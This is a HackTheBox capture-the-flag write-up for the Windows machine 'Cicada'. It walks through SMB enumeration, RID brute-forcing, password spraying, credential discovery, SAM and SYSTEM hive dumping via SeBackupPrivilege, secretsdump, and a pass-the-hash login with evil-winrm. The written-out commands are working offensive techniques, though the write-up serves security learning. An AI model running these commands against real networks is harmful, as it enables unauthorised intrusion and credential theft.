---
title: "Cicada"
date: 2026-02-21T00:00:00
draft: false
sources: "HackTheBox"
difficulties: "Easy"
tags: ["Windows", "Active Directory", "User Enumeration", "SeBackup"]
author: "Anx"
description: "Cicada is an easy-difficult Windows machine that focuses on beginner Active Directory enumeration and exploitation. In this machine, players will enumerate the domain, identify users, navigate shares, uncover plaintext passwords stored in files, execute a password spray, and use the `SeBackupPrivilege` to achieve full system compromise."
---

![](featured.png)

## Enumeration
### Nmap

An initial TCP scan was performed using Nmap to identify exposed services on the target host.

```
sudo nmap -sVC 10.129.1.223 -oA nmap/10.129.1.223-tcp

Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 12:26 CET
Nmap scan report for 10.129.1.223
Host is up (0.064s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-21 18:27:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-21T18:29:20+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-02-21T18:29:19+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-21T18:29:20+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-02-21T18:29:19+00:00; +7h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-21T18:28:40
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.70 seconds
```

The scan revealed multiple services consistent with a Windows Domain Controller, including DNS (53), Kerberos (88), LDAP (389/636/3268/3269), SMB (445), RPC (135/593), and WinRM (5985). The LDAP service identified the domain as `cicada.htb`, and the certificate subject confirmed the hostname `CICADA-DC.cicada.htb`.

To ensure proper name resolution during subsequent interactions, the domain name was added to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

![](Pasted%20image%2020260221123155.png)

### SMB Shares

Anonymous access to SMB was permitted. A shared folder named `HR` was accessible using the Guest account.

The available shares were enumerated using NetExec:

```bash
nxc smb cicada.htb -u 'Guest' -p '' --shares
```

![](Pasted%20image%2020260221123543.png)

The `HR` share was accessed using `smbclient`:

```bash
smbclient //cicada.htb/HR -U 'Guest%'
smb: \> mget "Notice from HR.txt"
```

![](Pasted%20image%2020260221123725.png)

Only one file, `Notice from HR.txt`, was present and downloaded for analysis:

```bash
cat Notice\ from\ HR.txt
```

![](Pasted%20image%2020260221123950.png)

The document contained onboarding instructions for new employees and disclosed the default password assigned to newly created domain accounts.

### Users with rid-brute

After obtaining a default password, the next step was to enumerate valid domain usernames.

A RID brute-force attack was conducted using NetExec:

```bash
nxc smb cicada.htb -u 'Guest' -p '' --rid-brute
```

![](Pasted%20image%2020260221131736.png)

To clear the output and generate a dictionary with valid domain usernames, the following command was executed:

```bash
awk '/SidTypeUser/ { split($6, a, "\\"); print a[2] }' rid-brute-users.txt > usernames.txt
```

![](Pasted%20image%2020260221133045.png)

### Password Spraying

Using the password identified in the HR notice and the generated username list, a password spraying attack was performed to identify accounts that had not changed the default password.

```bash
nxc smb cicada.htb -u usernames.txt -p <password> --continue-on-success
```

![](Pasted%20image%2020260222201449.png)

The attack revealed valid credentials for the user `michael.wrightson`.

### Domain users

With valid credentials, further domain enumeration was performed.

```bash
nxc smb cicada.htb -u 'michael.wrightson' -p <password> --users
```

![](Pasted%20image%2020260222201558.png)

During enumeration, it was observed that the user `david.orelious` had a password stored in the account description field.
## FootHold

Using the credentials of `david.orelious`, SMB shares were enumerated again. A new readable share named `DEV` was identified.

The share was accessed:

```bash
nxc smb cicada.htb -u 'david.orelious' -p <password> --shares
```

![](Pasted%20image%2020260222201643.png)

A single file, `Backup_script.ps1`, was found and downloaded:

```bash
smbclient //cicada.htb/dev -U 'david.orelious'
smb: \> mget Backup_script.ps1
```

![](Pasted%20image%2020260221134337.png)

The file was a backup script and contained clear text credentials for the user `emily.oscars`.

![](Pasted%20image%2020260221134451.png)

The recovered credentials were valid to access via WinRM.

```bash
evil-winrm -u 'emily.oscars' -p '<password>' -i cicada.htb
```

![](Pasted%20image%2020260221134625.png)

## Privilege Escalation

The privileges of the compromised account were enumerated:

```bash
whoami /priv
```

![](Pasted%20image%2020260221134804.png)

The account possessed the `SeBackupPrivilege`, which allows the user to bypass file-level access controls and read any file on the system.

This privilege was abused to export and download the SAM and SYSTEM registry hives:

```bash
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
```

![](Pasted%20image%2020260221140106.png)

![](Pasted%20image%2020260221141530.png)

The hashes of the local users were extracted using impacket secretsdump:

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

![](Pasted%20image%2020260221141707.png)

The extraction revealed the NTLM hash of the local `Administrator` account. Subsequently, a Pass-the-Hash attack was performed to obtain a privileged shell using WinRM.

```bash
evil-winrm -u Administrator -H <hash> -i cicada.htb
```

![](Pasted%20image%2020260221141747.png)